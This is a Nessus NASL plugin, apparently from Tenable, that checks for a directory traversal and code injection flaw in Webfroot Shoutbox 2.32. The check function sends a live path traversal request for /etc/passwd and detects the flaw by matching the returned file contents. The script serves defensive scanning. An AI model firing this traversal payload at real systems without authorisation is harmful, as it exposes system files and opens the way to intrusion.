#
# This script is (C) Tenable Network Security
#
#
# Ref:
#  Date: Thu, 29 May 2003 11:52:54 +0800
#  From: pokleyzz <pokleyzz@scan-associates.net>
#  To: vulnwatch@vulnwatch.org, bugtraq@securityfocus.com
#  Cc: tech@scan-associates.net
#  Subject: [VulnWatch] Webfroot Shoutbox 2.32 directory traversal and code injection.



if(description)
{
 script_id(11668);
 script_bugtraq_id(7737, 7746, 7772, 7775);
 script_version ("$Revision: 1.10 $");

 name["english"] = "Webfroot shoutbox file inclusion";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
directory traversal and code injection vulnerabilities. 

Description :

The remote host is running Webfroot Shoutbox, a PHP application that
allows website visitors to leave one another messages. 

The version of Webfroot Shoutbox installed on the remote host allows
an attacker to read arbitrary files and possibly to inject arbitrary
PHP code into the remote host and gain a shell with the privileges of
the web server. 

See also :

http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0090.html
http://downloads.securityfocus.com/vulnerabilities/exploits/expanded.pl
http://cvs.sourceforge.net/viewcvs.py/shoutbox/shoutbox/docs/readme.txt?rev=1.2&view=markup

Solution : 

Upgrade to the Shoutbox 2.35 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of shoutbox.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/shoutbox.php?conf=../../../../../../../../etc/passwd"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*:.*", string:r))
 {
 	security_hole(port);
	exit(0);
 }
 
 req = http_get(item:string(loc, "/shoutbox.php?conf=../"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL )exit(0);
 if(egrep(pattern:"main.*ioctl.*/.*/shoutbox\.php.*51", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}



foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
